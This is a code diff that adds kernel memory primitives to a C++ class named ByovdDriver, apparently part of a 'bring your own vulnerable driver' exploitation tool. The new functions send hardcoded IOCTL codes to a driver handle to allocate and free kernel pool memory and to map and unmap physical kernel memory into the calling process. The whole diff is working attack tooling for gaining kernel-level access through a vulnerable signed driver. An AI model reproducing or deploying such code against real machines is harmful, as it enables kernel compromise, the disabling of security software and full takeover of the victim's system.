@@ -338,3 +338,49 @@ uint64_t ByovdDriver::FindKernelBase()
     }
     return m_kernelBase;
 }
+
+bool ByovdDriver::AllocateKernelPool(uint64_t size, uint64_t* outPhysAddr)
+{
+    if (m_deviceHandle == INVALID_HANDLE_VALUE || !outPhysAddr) return false;
+    DWORD bytesReturned = 0;
+    uint64_t physAddr = 0;
+    BOOL result = DeviceIoControl(m_deviceHandle, 0x80002018, // IOCTL_ALLOC_POOL
+        &size, sizeof(size), &physAddr, sizeof(physAddr), &bytesReturned, nullptr);
+    if (result && bytesReturned == sizeof(physAddr) && physAddr) {
+        *outPhysAddr = physAddr;
+        return true;
+    }
+    return false;
+}
+
+bool ByovdDriver::FreeKernelPool(uint64_t physAddr)
+{
+    if (m_deviceHandle == INVALID_HANDLE_VALUE) return false;
+    DWORD bytesReturned = 0;
+    return DeviceIoControl(m_deviceHandle, 0x8000201C, // IOCTL_FREE_POOL
+        &physAddr, sizeof(physAddr), nullptr, 0, &bytesReturned, nullptr) != FALSE;
+}
+
+bool ByovdDriver::MapKernelMemory(uint64_t physAddr, uint64_t size, void** outVa)
+{
+    if (m_deviceHandle == INVALID_HANDLE_VALUE || !outVa) return false;
+    DWORD bytesReturned = 0;
+    struct { uint64_t physAddr; uint64_t size; } input = { physAddr, size };
+    uint64_t va = 0;
+    BOOL result = DeviceIoControl(m_deviceHandle, 0x80002020, // IOCTL_MAP_MEMORY
+        &input, sizeof(input), &va, sizeof(va), &bytesReturned, nullptr);
+    if (result && bytesReturned == sizeof(va) && va) {
+        *outVa = (void*)va;
+        return true;
+    }
+    return false;
+}
+
+bool ByovdDriver::UnmapKernelMemory(void* va)
+{
+    if (m_deviceHandle == INVALID_HANDLE_VALUE) return false;
+    DWORD bytesReturned = 0;
+    uint64_t addr = (uint64_t)va;
+    return DeviceIoControl(m_deviceHandle, 0x80002024, // IOCTL_UNMAP_MEMORY
+        &addr, sizeof(addr), nullptr, 0, &bytesReturned, nullptr) != FALSE;
+}
